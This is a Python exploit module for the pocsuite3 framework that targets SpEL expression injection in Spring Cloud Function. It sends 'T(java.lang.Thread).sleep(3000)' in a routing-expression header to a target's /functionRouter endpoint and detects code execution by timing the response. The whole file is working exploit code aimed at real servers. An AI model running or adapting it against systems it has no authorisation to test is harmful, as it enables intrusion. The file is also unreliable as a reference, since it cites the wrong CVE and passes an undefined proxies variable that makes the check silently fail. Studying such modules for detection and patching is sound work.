# !/usr/bin/env python
# -*- coding: UTF-8 -*-
import json
import re
from urllib.parse import urlparse
import time
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE


class Spring_Cloud_Function_SpEL(POCBase):
    vulID = 'Spring-Cloud-Function-SpEL'
    version = '1.0'
    author = ['Warin9_0']
    vulDate = '2022-03-03'
    createDate = '2022-03-03'
    updateDate = '2022-03-03'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2022-22947']
    name = 'Spring-Cloud-Function-SpEL'
    appPowerLink = ''
    appName = 'Spring-Cloud-Function-SpEL'
    appVersion = """Spring-Cloud-Function-SpEL"""
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Spring-Cloud-Function-SpEL'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        target = self.url
        self.timeout = 5
        if target:
            try:
                self.timeout = 5
                vulurl = target + "/functionRouter"
                parse = urlparse(vulurl)
                poc = "T(java.lang.Thread).sleep(3000)"
                headers = {
                     "Host": "{}".format(parse.netloc),
                    "spring.cloud.function.routing-expression": poc
                }
                data = "rush A"
                try:

                    resq = requests.post(vulurl, headers=headers, timeout=self.timeout, data=data,verify=False,proxies=px)
                except Exception:
                    return False
                else:
                    if resq.elapsed.total_seconds() >= 3:
                            result['VerifyInfo'] = {}
                            result['VerifyInfo']['URL'] = target
            except Exception as e:
                print(e)

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(Spring_Cloud_Function_SpEL)
